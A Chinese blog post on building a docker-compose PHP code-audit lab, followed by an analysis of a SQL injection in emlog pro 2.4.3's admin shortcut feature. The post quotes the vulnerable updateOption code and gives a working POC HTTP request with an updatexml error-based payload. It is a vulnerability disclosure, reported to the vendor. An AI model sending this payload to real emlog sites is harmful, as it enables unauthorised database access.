---
author: Noel
pubDatetime: 2025-01-24T16:00:11.000+08:00
modDatetime: 2025-01-24T16:00:11.000+08:00
title: 使用docker-compose快速搭建PHP代码审计环境
featured: false
draft: false
tags:
  - 网络安全
  - 代码审计
description: |
   https://github.com/N0el4kLs/php_aduit_docker-compose，快速搭建PHP代码审计环境
---





## Table of Contents

## 前言

最近疯狂代审，对快速搭建环境有一定的需求。之前的[快速搭建环境项目](https://github.com/N0el4kLs/PHPSTORM_Docker_debug)也能用，就是每次要审计另一套新源码时，就得把`src/source`下的代码替换成新项目的，太麻烦了。

于是重新配了个`docker-compose.yaml`，来帮助快速启动环境。主要就是使用的 `location`, 转发到不同web项目的根目录。现在轻松配置后，就能在多套源码之间自由切换。

项目地址：https://github.com/N0el4kLs/php_aduit_docker-compose



下面分享下实际操作过程。

## emlog环境搭建

前往https://github.com/emlog/emlog/releases/tag/pro-2.4.3 下载源码，解压后，将整个项目文件夹移动到`/path/to/php_aduit_docker-compose/src`下。

此时目录结构大致如下：

```
├── README.assets
│  ...
├── README.md
├── docker
│  ...
├── docker-compose.yml
├── logs
│  ...
├── src
│   ├── emlog_pro_2.4.3
│   │   ...
├── docker-compose.yml
├── start.sh
```

随后使用`./start.sh`快速配置`Nginx`：

![image-20250124144622871](https://particles.oss-cn-beijing.aliyuncs.com/blog_img/20250124160750353-dd1ed.png)

![image-20250124144738259](https://particles.oss-cn-beijing.aliyuncs.com/blog_img/20250124160750354-aa908.png)

接下来(重新)启动容器：

```
./start.sh start
or
./start.sh restart
```

![image-20250124144931303](https://particles.oss-cn-beijing.aliyuncs.com/blog_img/20250124160750354-1d167.png)



访问 `http://127.0.0.1:8089/emlog/`,配置安装信息，其中**数据库地址为`mysql:3306`,** 用户名和密码默认为`docker/docker`,如需修改数据库信息，根据情况修改`docker-compose.yml`中就好了。

![image-20250124145058809](https://particles.oss-cn-beijing.aliyuncs.com/blog_img/20250124160750354-a494b.png)



直接安装就行

![image-20250124145407212](https://particles.oss-cn-beijing.aliyuncs.com/blog_img/20250124160750354-8237d.png)

## SQL Injection 分析

在 `src/emlog_pro_2.4.3/include/lib/input.php`中定义了多个获取用户输入的函数，发现除了`function postStrArray()`,其余部分都使用了`addslashe()` 对输入进行了处理。通过查找 `postStrArray()` 的引用, 发现在 `src/emlog_pro_2.4.3/admin/index.php:101`存在一处SQL注入。

在`src/emlog_pro_2.4.3/admin/index.php:101`,将`postStrArray()`的结果赋值给 `shortcut`,随后,变量 `shortcutSet` 随后被传递到 `admin/index.php:110` 中的 `Option::updateOption` 函数。

该函数的实现（位于 `include/lib/option.php:247`）构造了以下 SQL 查询：

```
static function updateOption($name, $value, $isSyntax = false)
{
    $DB = Database::getInstance();
    $value = $isSyntax ? $value : "'$value'";
    $sql = 'INSERT INTO ' . DB_PREFIX . "options (option_name, option_value) values ('$name', $value) ON DUPLICATE KEY UPDATE option_value=$value, option_name='$name'";
    $DB->query($sql);
}
```

变量 `shortcutSet` 被直接拼接到 SQL 语句中，导致了 SQL 注入漏洞。



## POC

```
POST /emlog/admin/index.php?action=add_shortcut HTTP/1.1
Host: 127.0.0.1:8089
Content-Length: 142
Cache-Control: max-age=0
sec-ch-ua: 
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:8089
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8089/emlog/admin/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=39414d02b517761e4a6cd2d0338bc1c4; EM_AUTHCOOKIE_jKQnE5hqIYWMTSYVJeHeqHO4ulwyvQsN=emlog%7C0%7C42f3cc5fa3f6a21fae628fa3ad525cb8
Connection: close

shortcut%5B%5D=%E9%93%BE%E6%8E%A5%7C%7Clink.php&shortcut[]=test%7c%7ctest.php'%20or%20updatexml(1%2cconcat(0x7e%2c(version()))%2c0)%20or'')%23
```

![image-20250124150918653](https://particles.oss-cn-beijing.aliyuncs.com/blog_img/20250124160750354-829c7.png)



漏洞已提交至仓库Issue：https://github.com/emlog/emlog/issues/313
